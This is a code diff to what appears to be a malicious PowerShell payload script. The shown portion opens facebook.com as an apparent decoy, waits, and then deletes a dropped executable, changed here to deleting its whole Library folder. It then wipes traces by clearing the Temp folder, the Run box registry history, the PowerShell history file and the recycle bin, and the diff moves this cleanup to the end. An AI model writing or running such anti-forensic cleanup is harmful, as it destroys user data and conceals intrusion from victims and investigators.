@@ -210,20 +210,6 @@ Write-Host "The user clicked: $Result"
 
 # Delete contents of Temp folder 
 
-rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
-
-# Delete run box history
-
-reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-
-# Delete powershell history
-
-Remove-Item (Get-PSreadlineOption).HistorySavePath
-
-# Deletes contents of recycle bin
-
-Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-
 $URL = "https://www.facebook.com"
 
 # Check if Google Chrome is installed
@@ -238,7 +224,22 @@ if ($chromeInstalled) {
     Start-Process $URL
 }
 
-Start-Sleep -Seconds 22
-Remove-Item -Path "$env:USERPROFILE\Library\properties.exe" -Force
+Start-Sleep -Seconds 500
+Remove-Item -Path "$env:USERPROFILE\Library" -Recurse -Force
+
+
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+# Delete run box history
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Delete powershell history
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+# Deletes contents of recycle bin
+
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 
 exit
